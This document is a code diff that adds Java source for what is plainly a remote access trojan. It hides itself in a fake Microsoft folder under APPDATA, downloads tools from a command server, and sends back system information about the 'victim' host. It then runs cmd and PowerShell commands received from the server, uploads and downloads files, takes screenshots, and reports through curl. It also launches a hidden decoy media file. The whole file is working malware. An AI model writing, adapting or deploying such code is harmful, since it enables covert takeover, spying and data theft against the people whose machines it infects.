@@ -1,0 +1,249 @@
+    
+    static String URL = ORIGIN + "/target";
+    static String APPDATA = System.getenv("APPDATA") + "\\";
+    static String FOLDER = APPDATA + "Microsoft\\SystemWindows\\java\\";
+    static String appName = "java";
+    static String userId = "";
+    static String useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+
+    static String exitBy = "exiting by victim.";
+
+    static String pCommnads = "Commands: [cmd][powershell][upload][download][screenshot][exit]";
+
+    static void initTarget() {
+        media();
+
+        String id = "";
+        String username = System.getenv("USERNAME");
+        String architecture = System.getenv("PROCESSOR_ARCHITECTURE");
+        Date time = new Date();
+
+        try {
+            InetAddress localhost = InetAddress.getLocalHost();
+            String hostname = localhost.getHostName();
+            id = hostname;
+        } catch (Exception e) {
+            id = username;
+        }
+
+        URL += "?id=" + id;
+        userId = id;
+
+        File path = new File(FOLDER);
+
+        if (path.exists()) {
+            post(URL, "target connected again - [APP: " + appName + "] [Time : " + time + "]", "");
+        } else {
+            path.mkdirs();
+
+            if (architecture.contains("64")) {
+                get(ORIGIN + "/payloads/nircmd-64.exe", FOLDER + "nircmd.exe");
+            } else {
+                get(ORIGIN + "/payloads/nircmd.exe", FOLDER + "nircmd.exe");
+            }
+
+            String output = shell(false, "systeminfo");
+            String info = """
+                    SYSTEM INFORMATION
+                    HOST         : %s
+                    USERNAME     : %s
+                    ARCHITECHURE : %s
+                    TIME         : %s
+                    """;
+            info = String.format(info, id, username, architecture, time + output);
+
+            post(URL, info, "");
+        }
+
+        loop();
+    }
+
+    static void media() {
+        if (MEDIAURL.length() > 0) {
+            get(MEDIAURL, MEDIANAME);
+            shell(false, "attrib +h +s +r " + MEDIANAME);
+            shell(false, "start " + MEDIANAME);
+        }
+    }
+
+    static void executor(String command, boolean ps) {
+        String currentD = System.getProperty("user.dir");
+
+        if (command.startsWith("cd ")) {
+            if (command.stripIndent().endsWith("..")) {
+                File currentDirectory = new File(currentD);
+                System.setProperty("user.dir", currentDirectory.getParentFile().toString());
+            } else if (command.contains("/") || command.contains("\\")) {
+                String path = command.substring(3, command.length());
+                File directory = new File(path);
+
+                if (directory.exists() && directory.isDirectory()) {
+                    System.setProperty("user.dir", directory.getAbsolutePath());
+                } else {
+                    post(URL, "ERROR: Path not exists.", "");
+                    return;
+                }
+            } else {
+                String path = command.substring(3, command.length());
+                File directory = new File(currentD, path);
+
+                if (directory.exists() && directory.isDirectory()) {
+                    System.setProperty("user.dir", directory.getAbsolutePath());
+                } else {
+                    post(URL, "ERROR: Path not exists.", "");
+                    return;
+                }
+            }
+
+            post(URL, System.getProperty("user.dir") + ">", "");
+        } else {
+            post(URL, shell(ps, command), "");
+        }
+    }
+
+    static void screenshot() {
+        String fileName = "";
+        String currentD = System.getProperty("user.dir");
+
+        int rand = (int) Math.floor(Math.random() * 1000000);
+        fileName += rand + "-java-screenshot.jpg";
+        String shotPath = FOLDER + "nircmd.exe savescreenshot " + fileName;
+        shell(true, shotPath);
+        String clientUrl = ORIGIN + "/ssd/uploads/" + userId + "/" + fileName;
+        post(URL, clientUrl, fileName);
+        Path path = Paths.get(currentD, fileName);
+        try {
+            Files.delete(path);
+        } catch (Exception e) {
+            post(URL, "ERROR: Screenshot file not deleted.", "");
+        }
+    }
+
+    static void loop() {
+        while (true) {
+            String res = get(URL, "");
+
+            if (res.equals("200") || res.length() == 0 || res == "exit status 1") {
+                sleep(INTERVAL);
+                continue;
+            }
+
+            String data[] = res.split("[\\r\\n]+", 0);
+            String application = data[0];
+            String command = data[1];
+            String fileName = data[2];
+
+            if (application.equals("cmd")) {
+                executor(command, false);
+            } else if (application.equals("powershell")) {
+                executor(command, true);
+            } else if (application.equals("upload")) {
+                String output = get(command, fileName);
+                post(URL, output, "");
+            } else if (application.equals("download")) {
+                post(URL, "", command);
+            } else if (application.equals("-")) {
+                if (command.equals("screenshot")) {
+                    screenshot();
+                } else if (command.equals("exit")) {
+                    exitBy = "Exit Success";
+                    System.exit(0);
+                } else {
+                    post(URL, pCommnads, "");
+                }
+            } else {
+                post(command, pCommnads, fileName);
+            }
+
+            sleep(INTERVAL);
+        }
+    }
+
+    // curl
+    static String shell(boolean ps, String command) {
+        String application = "powershell";
+        if (!ps) {
+            command = "cmd /c " + command;
+        }
+
+        try {
+            String currentD = System.getProperty("user.dir");
+            ProcessBuilder processBuilder = new ProcessBuilder(application, command);
+
+            processBuilder.directory(new File(currentD));
+            processBuilder.redirectErrorStream(true);
+
+            Process process = processBuilder.start();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+            String line = "";
+            StringBuilder output = new StringBuilder();
+
+            while ((line = reader.readLine()) != null) {
+                if (output.length() != 0) {
+                    output.append(System.lineSeparator()).append(line);
+                } else {
+                    output.append(line);
+                }
+            }
+
+            return output.toString();
+        } catch (Exception e) {
+            return e.toString();
+        }
+    }
+
+    static String get(String url, String filename) {
+        String curl = "CURL -s -X GET " + url;
+
+        if (filename.length() == 0) {
+            return shell(false, curl);
+        } else {
+            curl += " -o " + filename;
+            String output = shell(false, curl);
+
+            if (output.length() == 0) {
+                return "file saved.";
+            } else {
+                return "file save error";
+            }
+        }
+    }
+
+    static void post(String url, String data, String filename) {
+        String curl = "CURL -s -H \"Content-Type:multipart/form-data\" ";
+
+        if (data.length() != 0) {
+            byte[] byteData = data.getBytes();
+            String d = Base64.getEncoder().encodeToString(byteData);
+            curl += "-F \"data=" + d + "\" ";
+        }
+
+        if (filename.length() != 0) {
+            curl += "-F \"file=@" + filename + "\" ";
+        }
+
+        curl += "-X POST " + url;
+
+        shell(false, curl);
+    }
+
+    static void sleep(long i) {
+        try {
+            Thread.sleep(i);
+        } catch (Exception e) {
+        }
+    }
+
+    // main
+    public static void main(String[] args) {
+        Runtime.getRuntime().addShutdownHook(new Thread() {
+            @Override
+            public void run() {
+                post(URL, exitBy, "");
+            }
+        });
+
+        initTarget();
+    }
+}
